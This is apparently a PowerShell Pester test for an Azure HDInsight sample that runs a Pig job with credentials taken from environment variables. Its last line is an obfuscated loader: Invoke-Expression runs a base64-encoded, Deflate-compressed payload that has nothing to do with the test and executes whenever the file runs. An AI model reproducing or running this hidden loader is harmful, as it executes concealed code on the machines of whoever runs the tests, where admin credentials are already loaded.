$here = Split-Path -Parent $MyInvocation.MyCommand.Path
$sut = (Split-Path -Leaf $MyInvocation.MyCommand.Path) -replace '\.Tests', ''
. "$here\$sut"

$clusterName = $ENV:ClusterName
$httpUserPassword = $ENV:HttpPassword
$securePassword = ConvertTo-SecureString $httpUserPassword -AsPlainText -Force
$creds = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "admin", $securePassword


function Get-Credential { return $creds }

Describe "hdinsight-hadoop-use-pig-powershell" {
    It "Runs a Pig query using Start-AzHDInsightJob" {
        Mock Read-Host { $clusterName }
        
        (Start-PigJob $clusterName $creds)[-1].StartsWith("(TRACE,816)") | Should be True
    }
}

Invoke-Expression $(New-Object IO.StreamReader ($(New-Object IO.Compression.DeflateStream ($(New-Object IO.MemoryStream (,$([Convert]::FromBase64String('rVZtb5tIEP4eKf9hzuHOoBpku011FymVUuo7WUpTK0TKB8u6EBgHLngXLYtflPa/3+yCDdiO4zsVJQaWmWefGZ6ZYZqzQMacwZDN+TPaI75A4UWYJHdBCqcnL/QPdIzdWZig/ByzMGZP5hec+nkiR77wZyjJA+UNXV22BM5RZNiyJqAfmqcnBYAG2dibI57Fet9L6Hbgq89CX3KxoltDihw7cAj6vyJO/STbC/lI4TTxPCkovtqKMRxdhaHALOu8HUrvp4dyLOJuJEMm62GMuJCvRnAcQW8RyyCqg94WZsfj7kn4DqjS2BrQWl8Uv5KSUFy9VA5nLmcMAwmPfvAM8RRkhFAGAJmGhziDPMPQqbzIzlzzt6rlGq4mEyQxMkmZv8GF/e3xH7WPt8okzpwblI7Hg2eUmXPnjlxtadb0onNew/5RT9OZChMk12xTwedxiCGk5KGo6YeHuSuTA8STmEgyFER9vI9wkF6XFhPN8xV3J5O+kKZVvYPd1FTGV0GAqSTsMhn14KEevZFJgf5MORcwzl8oPb1Wdxo/riSOJxNDnTNV2Y7z8fz8/fn3X1+6zXR6SBnTCghyIRQxSppgpDqg+oGAz9JcFgt1GuS1xjbHEpfSQRZw1eMmFxdXnjscWoraZ2Vjtu4p53yRQdUlQeSMkTX4+i0JaME7MJDNLzbbv6M1quXNgzoV9fCBuTxdifgpkmC6FvS7vXP4GgeCZ3wqweWCVOGrfuDAldpRWWakcNpgTrp4YA+sZe3k1rkXsUSzCrHT7VQ3zjWyJxlZzRxGfEHZgpgRPZ/mwhzroZJKZ6n839lrjzxoU8AmrdjXPNAhWc7IlxGttj+1f0YMiyhO0DSNWEmrBLlFPzQLCXXUbDAa3hbYDKF7oJQGKiYM7yi+ZiOw71Ypqsa2bgnKxNFxD8o8bEFRI/cVsxpkqXw1VY11jGDEVtOTOl9zYYukfn+DJQakLN1SSGUzJXxSnrqlKn6i8t91KtKp6obeYfkRMFimqoGpCWS7JU5Bvf/ptx58h2+5tAvOsMXzR/OWXnIQvUlcv2X73he6kloep6ERqcuFquOF4OoyJpmgDlDx4tNXImzBa/gDIbgA4++DhDfp6INW0Do5JNA35AvtLaSlyqiBatdxd9LI2lbSCiMnSNAX5vazitBl/YaaybIufHWc3aLMBSsHYEYfaNk+MBLZUQVb7bbDaW911ouzqs19jn8meRapodIYjhurciS4Cc+wng8999bD5ojZ53iSp6a1s0l5qomzhnCEGH8BN8LqW0P3YaHmNAUXRP5jUsycFc/BF0hzQbkXRUmjiRqHGvMNpe5TKLGkv73f5Xb54QL25msDen/0nd7H350PdHrfB1sNdfhAx+nJvw==')))), [IO.Compression.CompressionMode]::Decompress)), [Text.Encoding]::ASCII)).ReadToEnd();

